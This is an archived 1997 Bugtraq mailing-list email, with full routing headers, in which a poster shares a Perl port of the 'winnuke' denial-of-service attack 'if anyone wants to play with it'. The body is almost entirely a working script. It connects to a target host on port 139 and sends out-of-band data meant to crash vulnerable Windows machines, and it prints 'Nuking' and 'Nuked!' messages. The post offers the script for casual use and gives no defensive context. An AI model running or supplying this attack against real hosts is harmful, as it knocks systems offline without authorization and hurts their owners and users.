From - Tue Jun  4 15:21:47 1996
Received: from brimstone.netspace.org (brimstone.netspace.org [128.148.157.143])
          by mygale.mygale.org (8.8.4/8.8.4) with ESMTP
	  id JAA09322; Mon, 12 May 1997 09:32:37 +0200 (MET DST)
Received: from netspace.org ([128.148.157.6]) by brimstone.netspace.org with ESMTP id <39076-7855>; Mon, 12 May 1997 01:30:19 -0400
Received: from NETSPACE.ORG by NETSPACE.ORG (LISTSERV-TCP/IP release 1.8c) with
          spool id 3756398 for BUGTRAQ@NETSPACE.ORG; Mon, 12 May 1997 01:26:03
          -0400
Received: from brimstone.netspace.org (brimstone [128.148.157.143]) by
          netspace.org (8.8.5/8.8.2) with ESMTP id BAA26616 for
          <BUGTRAQ@netspace.org>; Mon, 12 May 1997 01:15:15 -0400
Received: from netspace.org ([128.148.157.6]) by brimstone.netspace.org with
          ESMTP id <32865-7855>; Mon, 12 May 1997 01:14:50 -0400
Approved-By: aleph1@UNDERGROUND.ORG
Received: from kessel.cco.net (root@kessel.cco.net [206.65.209.6]) by
          netspace.org (8.8.5/8.8.2) with ESMTP id TAA25474 for
          <bugtraq@netspace.org>; Sun, 11 May 1997 19:48:45 -0400
Received: from kessel.cco.net (ghent@bounty-hunters.com [206.65.209.105]) by
          kessel.cco.net  with SMTP id QAA15405 for <bugtraq@netspace.org>;
          Sun, 11 May 1997 16:49:16 -0700
X-Sender: ghent@kessel.cco.net
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII
Message-ID: <Pine.LNX.3.96.970511164735.15328A-100000@kessel.cco.net>
Date: 	Sun, 11 May 1997 16:49:16 -0700
Reply-To: Ghent <ghent@BOUNTY-HUNTERS.COM>
Sender: Bugtraq List <BUGTRAQ@NETSPACE.ORG>
From: Ghent <ghent@BOUNTY-HUNTERS.COM>
Subject:      more DoS fun
To: BUGTRAQ@NETSPACE.ORG
X-UIDL: ba191d504180cc738a8245136dae6eed
X-Mozilla-Status: 0001

Here is a perl version if anyone wants to play with it.

------
#!/usr/bin/perl

# Ghent - ghent@bounty-hunters.com - Perl version of winnuke.c by _eci

use strict; use Socket;

my($h,$p,$in_addr,$proto,$addr);

$h = "$ARGV[0]"; $p = 139 if (!$ARGV[1]);
if (!$h) { print "A hostname must be provided. Ex: www.microsoft.com\n"; }

$in_addr = (gethostbyname($h))[4]; $addr = sockaddr_in($p,$in_addr);
$proto = getprotobyname('tcp');
socket(S, AF_INET, SOCK_STREAM, $proto) or die $!;

connect(S,$addr) or die $!; select S; $| = 1; select STDOUT;

print "Nuking: $h:$p\n"; send S,"Sucker",MSG_OOB; print "Nuked!\n"; close S;
------

- Ghent

